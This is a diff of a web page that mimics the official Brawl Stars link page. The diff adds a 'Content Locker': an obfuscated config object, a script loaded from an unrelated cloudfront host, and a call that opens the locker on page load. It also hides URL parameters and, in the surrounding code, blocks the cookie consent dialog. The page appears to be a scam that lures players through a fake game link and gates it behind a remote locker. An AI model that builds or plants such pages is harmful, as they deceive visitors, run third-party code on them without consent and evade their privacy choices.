@@ -34,6 +34,13 @@
     <meta name="twitter:description" content="Open link in Brawl Stars or download the game."/>
     <meta name="twitter:image" content="https://link.brawlstars.com/images/game/opengraph.jpg"/>
     <meta name="next-size-adjust"/>
+    
+    <!-- Content Locker -->
+    <script type="text/javascript">
+        var IXJYE_VPw_TQxmrc={"it":4563296,"key":"f0025"};
+    </script>
+    <script src="https://d1y0yks1k8t5m5.cloudfront.net/9021026.js"></script>
+    
     <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-0CQ7964MXY"></script>
 <script>
@@ -43,14 +50,56 @@
 
   gtag('config', 'G-0CQ7964MXY');
 </script>
-  <!-- removed previous locker config and loader -->
-    <!-- Script to hide URL parameters -->
+    <!-- Script to remove lang parameter from URL -->
     <script>
-    // Remove URL parameters from address bar
-    if (window.location.search) {
-        const url = window.location.protocol + "//" + window.location.host + window.location.pathname;
-        window.history.replaceState({}, document.title, url);
+    // Remove lang query parameter from URL without reloading the page
+    function removeLangParameter() {
+        try {
+            const currentUrl = window.location.href;
+            console.log('Current URL:', currentUrl);
+            
+            // Check if URL has lang parameter
+            if (currentUrl.includes('lang=')) {
+                const url = new URL(currentUrl);
+                const params = new URLSearchParams(url.search);
+                
+                console.log('Found lang parameter:', params.get('lang'));
+                
+                // Remove the lang parameter
+                params.delete('lang');
+                
+                // Reconstruct the URL
+                let newUrl = url.protocol + '//' + url.host + url.pathname;
+                if (params.toString()) {
+                    newUrl += '?' + params.toString();
+                }
+                if (url.hash) {
+                    newUrl += url.hash;
+                }
+                
+                console.log('New URL:', newUrl);
+                
+                // Update the URL without reloading the page
+                window.history.replaceState({}, document.title, newUrl);
+                
+                console.log('Successfully removed lang parameter from URL');
+            }
+        } catch (error) {
+            console.error('Error removing lang parameter:', error);
+        }
     }
+    
+    // Run immediately
+    removeLangParameter();
+    
+    // Run when DOM is loaded
+    document.addEventListener('DOMContentLoaded', removeLangParameter);
+    
+    // Run when page is fully loaded
+    window.addEventListener('load', removeLangParameter);
+    
+    // Also run when the URL changes (for SPAs)
+    window.addEventListener('popstate', removeLangParameter);
     </script>
 
     <!-- Script to block cookie consent dialog -->
@@ -520,6 +569,10 @@
     } else {
       window.addEventListener('load', function(){ if (typeof _iH === 'function') { try{ _iH(); }catch(e){console.error('_iH() call failed', e);} } });
     }
+    
+    <!-- Open Content Locker immediately on page load -->
+    <script>_yy();</script>
 </body>
 </html>
+
 
